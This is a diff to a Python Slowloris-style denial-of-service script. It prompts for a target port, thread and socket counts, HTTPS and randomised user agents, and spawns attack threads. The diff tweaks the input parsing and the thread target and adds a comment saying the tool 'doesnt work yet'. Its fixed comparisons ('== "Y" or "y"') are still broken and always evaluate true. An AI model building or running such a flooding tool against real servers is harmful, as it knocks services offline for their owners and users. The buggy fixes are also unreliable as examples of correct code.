@@ -1,3 +1,4 @@
+# doesnt work yet
 import socket,threading,time,random,logging
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -31,17 +32,17 @@ port=int(input("[+] Port: "))
 threads=int(input("[+] Threads: "))
 socket_count=int(input("[+] Sockets: "))
 https=input("[+] HTTPS [Y/N]? ")
-if https == Y|y:
+if https == "Y" or "y":
    https = True
    print("[+] HTTPS set to 'True'.")
-elif https == N|n:
+elif https == "N" or "n":
    https = False
    print("[+] HTTPS set to 'False'.")
 randuseragent=input("[+] Random user agent [Y/N]? ")
-if randuseragent == Y|y:
+if randuseragent == "Y" or "y":
    randuseragent = True
    print("[+] Random user agent 'ON'.")
-elif randuseragent == N|n:
+elif randuseragent == "N" or "n":
    randuseragent = False
    print("[+] Random user agent 'OFF'.")
 sleeptime=int(input("[+] Sleeptime: "))
@@ -100,7 +101,7 @@ def main():
             logging.info("Stopping Slowloris")
             break
 for i in range(int(threads)):
-  t = threading.Thread(target=httpspam)
+  t = threading.Thread(target=main)
   print("[+] Thread {0} created".format(str(i)))
   t.start()
   t.join()
